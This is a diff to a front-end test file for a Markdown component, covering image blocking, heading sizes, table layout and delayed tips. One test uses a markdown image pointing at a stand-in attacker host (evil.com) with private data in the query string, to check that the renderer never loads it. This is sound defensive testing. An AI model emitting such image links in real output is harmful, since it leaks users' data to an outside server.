@@ -6,8 +6,34 @@ describe('Markdown', () => {
   it('shows a picture’s description and never loads its address', () => {
     const html = renderToStaticMarkup(<Markdown text="Look: ![a chart](https://evil.com/p.png?d=private)" />)
     expect(html).toContain('a chart')
+    expect(html).toContain('Picture not shown, to keep you safe')
     expect(html).not.toContain('<img')
     expect(html).not.toContain('evil.com')
+  })
+
+  it('never shows a display-size heading: every level reads as one title size (Spec 03)', () => {
+    const html = renderToStaticMarkup(<Markdown text={'# Big\n\n## Medium\n\n#### Small'} />)
+    expect(html.match(/<h3>/g)).toHaveLength(3)
+    expect(html).not.toMatch(/<h[1245]/)
+  })
+
+  it('puts a table in its own sideways-scrolling box, numbers right-aligned', () => {
+    const html = renderToStaticMarkup(<Markdown text={'| Otter | Kg |\n| --- | --- |\n| Sea | 30 |\n| River | 1,200.5 |'} />)
+    expect(html).toMatch(/^<div class="md"><div class="md-table"><table>/)
+    expect(html.match(/<td class="md-num">/g)).toHaveLength(2)
+    expect(html).toContain('<td>Sea</td>')
+  })
+
+  it('keeps a tip back until the answer finishes, then labels it Good to know', () => {
+    const tip = (done: boolean) =>
+      renderToStaticMarkup(
+        <ProofreadContext.Provider value={{ source: '', done }}>
+          <Markdown text={'Answer.\n\n> 💡 Otters hold hands.'} />
+        </ProofreadContext.Provider>
+      )
+    expect(tip(false)).not.toContain('Otters hold hands')
+    expect(tip(true)).toContain('Good to know')
+    expect(tip(true)).toContain('Otters hold hands')
   })
 })
 
